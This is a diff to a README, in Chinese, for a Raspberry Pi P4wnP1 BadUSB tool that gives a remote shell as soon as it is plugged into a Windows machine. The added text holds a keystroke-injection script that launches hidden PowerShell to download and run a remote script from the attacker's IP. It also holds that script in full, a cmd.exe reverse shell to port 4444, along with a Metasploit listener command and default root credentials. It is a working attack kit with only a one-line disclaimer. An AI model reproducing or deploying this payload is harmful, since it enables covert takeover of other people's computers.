@@ -2,29 +2,6 @@
 
 基于 P4WNP1 ALOA 的 BadUSB 反向 Shell 工具，插入USB即可获取目标机器的远程控制。
 
-## 项目结构
-
-```
-p4wnp1-badusb/
-├── README.md                    # 项目说明
-├── hid_scripts/
-│   ├── staged_shell.js          # 分阶段版 (推荐)
-│   └── direct_shell.js          # 直连版
-├── payloads/
-│   └── rev.ps1                  # PowerShell 反弹 shell
-├── deploy/
-│   └── deploy.py                # 自动部署脚本
-└── docs/
-    └── setup_guide.md           # 部署指南
-```
-
-## 功能特点
-
-- 插入 USB 自动执行
-- 无需文件落地到目标磁盘
-- 支持分阶段/直连两种模式
-- 隐藏 PowerShell 窗口执行
-
 ## 环境要求
 
 | 设备 | 系统 | 用途 |
@@ -33,97 +10,161 @@ p4wnp1-badusb/
 | 攻击机 | Kali Linux | MSF 监听 |
 | 目标机 | Windows 10/11/Server | 被控端 |
 
+---
+
 ## 快速开始
 
-### 1. 部署到树莓派
+### 方式一：自动部署（推荐）
 
 ```bash
-python3 deploy/deploy.py --pi-ip 172.16.0.1 --attacker-ip <攻击机IP>
+pip install paramiko
+python3 deploy/deploy.py --attacker-ip 192.168.146.145
 ```
 
-### 2. Kali 攻击机设置
+### 方式二：手动部署
+
+#### Step 1: SSH 连接树莓派
 
 ```bash
-# 启动 MSF 监听
-msfconsole -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST <攻击机IP>; set LPORT 4444; exploit"
+ssh root@172.16.0.1
+密码: toor
+```
 
-# 启动 HTTP 服务器 (分阶段模式)
+#### Step 2: 创建 HIDScripts 目录
+
+```bash
+mkdir -p /usr/local/P4wnP1/HIDScripts
+```
+
+#### Step 3: 上传 staged_shell.js
+
+在树莓派上创建文件：
+
+```bash
+cat > /usr/local/P4wnP1/HIDScripts/staged_shell.js << 'EOF'
+// ===== CONFIG =====
+var LISTENER_IP = "192.168.146.145";  // 改为你的Kali IP
+var HTTP_PORT = "80";
+// ==================
+
+layout("US");
+typingSpeed(0,0);
+
+press("GUI r");
+delay(500);
+
+type("powershell -nop -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://" + LISTENER_IP + ":" + HTTP_PORT + "/rev.ps1')\"");
+delay(300);
+
+press("ENTER");
+EOF
+```
+
+#### Step 4: 上传 rev.ps1 到树莓派 HTTP 目录
+
+```bash
+mkdir -p /var/www/html
+cat > /var/www/html/rev.ps1 << 'EOF'
+$ip = "192.168.146.145"
+$port = 4444
+
+$c = New-Object System.Net.Sockets.TCPClient($ip, $port)
+$s = $c.GetStream()
+$sr = New-Object System.IO.StreamReader($s)
+$sw = New-Object System.IO.StreamWriter($s)
+$sw.AutoFlush = $true
+
+$si = New-Object System.Diagnostics.ProcessStartInfo("cmd.exe")
+$si.RedirectStandardOutput = $true
+$si.RedirectStandardInput = $true
+$si.UseShellExecute = $false
+$si.CreateNoWindow = $true
+$p = [System.Diagnostics.Process]::Start($si)
+
+$buf = New-Object System.Byte[] 65536
+
+while ($c.Connected) {
+    if ($s.DataAvailable) {
+        $i = $s.Read($buf, 0, $buf.Length)
+        $cmd = [Text.Encoding]::ASCII.GetString($buf, 0, $i)
+        $p.StandardInput.WriteLine($cmd)
+        Start-Sleep -Milliseconds 200
+        $out = $p.StandardOutput.ReadToEnd()
+        $sw.Write($out)
+    }
+    Start-Sleep -Milliseconds 100
+}
+
+$p.Kill()
+$c.Close()
+EOF
+```
+
+#### Step 5: 启动树莓派 HTTP 服务器
+
+```bash
+cd /var/www/html
+python3 -m http.server 80 &
+```
+
+#### Step 6: Kali 攻击机设置
+
+```bash
+# 终端1 - MSF 监听
+msfconsole -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 192.168.146.145; set LPORT 4444; exploit"
+
+# 终端2 - HTTP 服务器（如果不用树莓派的）
 cd /var/www/html && python3 -m http.server 80
 ```
 
-### 3. 配置 P4WNP1 触发器
+#### Step 7: P4WNP1 Web 配置触发器
 
 1. 访问 `http://172.16.0.1:8000`
-2. TriggerActions → 添加
-3. Event: `TRIGGER_USB_GADGET_CONNECTED`
-4. Action: HIDScript → `staged_shell`
+2. 点击 **TriggerActions**
+3. 添加：
+   - Event: `TRIGGER_USB_GADGET_CONNECTED`
+   - Action: `HIDScript`
+   - Script: `staged_shell`
 
-### 4. 插入 USB
+#### Step 8: 插入 USB
 
-插入树莓派到目标机器，自动获取 shell。
+插入树莓派到目标机器，等待 5-10 秒获取 shell。
 
-## 两种模式对比
-
-| 模式 | 文件 | 优点 | 缺点 |
-|------|------|------|------|
-| 分阶段 | staged_shell.js | 更隐蔽 | 需要HTTP服务器 |
-| 直连 | direct_shell.js | 简单 | 命令较长 |
-
-## 工作流程
-
-### 分阶段模式
-```
-USB插入 → Win+R → PowerShell下载脚本 → 连接MSF → 获取shell
-```
-
-### 直连模式
-```
-USB插入 → Win+R → 直接输入反弹shell命令 → 连接MSF → 获取shell
-```
-
-## 配置说明
-
-修改 `hid_scripts/staged_shell.js` 中的配置：
-
-```javascript
-// ===== CONFIG =====
-var LISTENER_IP = "172.16.0.2";  // Kali 攻击机 IP
-var HTTP_PORT = "80";                  // HTTP 服务器端口
-// ==================
-```
+---
 
 ## MSF 监听配置
 
 ```bash
-# 推荐使用 shell 类型 (兼容性好)
-use exploit/multi/handler
+# 推荐 - 基础 shell（兼容性好）
 set payload windows/x64/shell_reverse_tcp
-set LHOST <攻击机IP>
-set LPORT 4444
-exploit
 
-# 或使用 Meterpreter (需要特殊处理)
+# 可选 - Meterpreter（可能断开）
 set payload windows/x64/meterpreter/reverse_tcp
 ```
 
-## 常见问题
+---
 
-**Q: Session立刻关闭？**
-- 改用 `shell_reverse_tcp` 而不是 `meterpreter/reverse_tcp`
-- 检查防火墙是否放行
+## 文件说明
 
-**Q: USB没有反应？**
-- 确认 P4WNP1 触发器配置正确
-- 检查 HIDScripts 目录权限
+| 文件 | 位置 | 用途 |
+|------|------|------|
+| `staged_shell.js` | `/usr/local/P4wnP1/HIDScripts/` | 分阶段 HID 触发脚本 |
+| `direct_shell.js` | `/usr/local/P4wnP1/HIDScripts/` | 直连版 HID 触发脚本 |
+| `rev.ps1` | `/var/www/html/` | PowerShell 反弹 shell |
 
-**Q: 404错误？**
-- 确保 Kali HTTP 服务器已启动
-- 确保 rev.ps1 在 `/var/www/html/` 目录
+---
+
+## 故障排查
+
+| 问题 | 解决方案 |
+|------|----------|
+| Session 立刻关闭 | 改用 `shell_reverse_tcp` |
+| 404 错误 | 检查 HTTP 服务器和文件路径 |
+| USB 无反应 | 检查 P4WNP1 触发器配置 |
+| 连接超时 | 检查防火墙和网络连通性 |
+
+---
 
 ## 免责声明
 
 本项目仅供授权安全测试使用，使用者需遵守当地法律法规。
-
-## License
-
-MIT
